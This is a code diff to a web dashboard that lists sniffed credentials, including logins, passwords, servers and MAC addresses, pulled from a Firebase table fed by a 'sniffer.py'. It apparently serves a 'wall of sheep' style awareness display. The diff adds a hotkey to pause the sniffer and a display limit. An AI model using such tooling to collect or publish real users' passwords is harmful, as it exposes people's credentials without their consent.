@@ -17,10 +17,12 @@
       <h1># Can I Get The Pas***ord?</h1>
       <h3>$ python sniffer.py</h3>
       <h3>After a while,</h3>
-      <h3>We have catched <span class='count-num'></span> sheep for dinner now.</h3>
+      <h3>Below are the newest <span class='count-num'></span> sheep we just catched for dinner now.</h3>
       <div class="status-container">Sniffer Status:
         <div class="status bg-red"></div>
       </div>
+      <h3 class="content-hidden sniffer-indication">Sniffer will restart in <span class="clock"></span> seconds.</h3>
+      <h3 class="closed-alert content-hidden fg-red">Someone or you closed the sniffer, please wait, no more than <span class="alert-clk"></span> seconds.</h3>
     </div>
 
 
@@ -56,18 +58,27 @@
 
     <script src='https://cdn.firebase.com/js/client/2.2.1/firebase.js'></script>
     <script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js'></script>
+    <script src='static/js-libs/jq-hotkey.js'></script>
     <script>
       var myDataRef = new Firebase('https://amber-inferno-5029.firebaseio.com/pwd_table'),
           statusRef = new Firebase('https://amber-inferno-5029.firebaseio.com/status'),
-          arrowEle = $('.arrow');
+          arrowEle = $('.arrow'),
+          statusListener,
+          timer,
+          timeLimit = '11',
+          clockEle = $('.clock'),
+          alertClk = $('.alert-clk'),
+          closedEle = $('.closed-alert');
+
+      clockEle.html(timeLimit);
+      alertClk.html(parseInt(timeLimit)-1);
 
       myDataRef.authAnonymously(function(error, authData) {
         if (error) {
             console.log("Login Failed!", error);
         } else {
-            /***
-              listen when the data changed.
-            ***/
+            myDataRef = myDataRef.endAt().limit(20);
+            //Trigger when the data changed.
             myDataRef.on('child_added', function(snapshot) {
               var message = snapshot.val(),
                   pwdStr = message.password,
@@ -86,24 +97,54 @@
               $('.count-num').html(snapshot.numChildren());
             });
 
-            statusRef.on("value", function(snapshot) {
+            // starting listening status;
+            statusListener();
+        }
+      });
+
+      function statusListener(){
+          statusRef.on("value", function(snapshot) {
                var s = snapshot.val().status,
                    statusEle = $('.status');
 
                if(s === 'ON'){
+                 closedEle.addClass('content-hidden');
                  statusEle.addClass('bg-green');
                }else{
                  statusEle.removeClass('bg-green');
                }
-            });
-        }
-      });
+          });
+      }
+
+      function reOpenStatus(){
+          clockEle.html(timeLimit);
+          clearTimeout(timer);
+          statusRef.once("value", function(snap) {
+             if(snap.val().status === 'OFF'){
+                  $('.sniffer-indication').addClass('content-hidden');
+                  statusRef.update({status: 'ON'});
+             }
+          });
+      }
+
+      function conuntDown(){
+          var s = parseInt(clockEle.html());
+          if(s === 0){
+            clearTimeout(timer);
+          }
+          s = s - 1;
+          clockEle.html(s);
+          timer = setTimeout("conuntDown();", 1000);
+      }
 
       function displayPairs(app, client, login, pwd, server, mac) {
         var innerLinkHtml = '<span class="' + server.replace(/\./g, '-') + '">' + server + '</span>';
 
         if (typeof mac==='undefined'){
             mac = 'No data';
+        }
+        if(typeof login==='undefined'){
+            login = '---';
         }
 
         $('<tr/>').text('').prepend($('<td/>').text(mac)).prepend($('<td/>').text(app.toUpperCase())).prepend($('<td/>').html(innerLinkHtml)).prepend($('<td/>').text(client)).prepend($('<td/>').text(pwd)).prepend($('<td/>').text(login)).prependTo($('#pwd-wall'));
@@ -132,6 +173,24 @@
       arrowEle.click(function(e){
         $('html, body').animate({scrollTop: 0}, 600);
       });
+
+      $(document).bind('keydown', 'shift+s', function(e){
+          statusRef.once("value", function(snap) {
+             if(snap.val().status === 'OFF'){
+                  closedEle.removeClass('content-hidden');
+                  return;
+             }else{
+                  statusRef.update({status: 'OFF'});
+                  $('.sniffer-indication').removeClass('content-hidden');
+                  setTimeout("reOpenStatus();", (parseInt(timeLimit)-1)*1000);
+                  conuntDown();
+             }
+          });
+      });
+
+      window.onbeforeunload = function() {
+        // statusRef.update({status: 'ON'});
+      }
 
 
     </script>
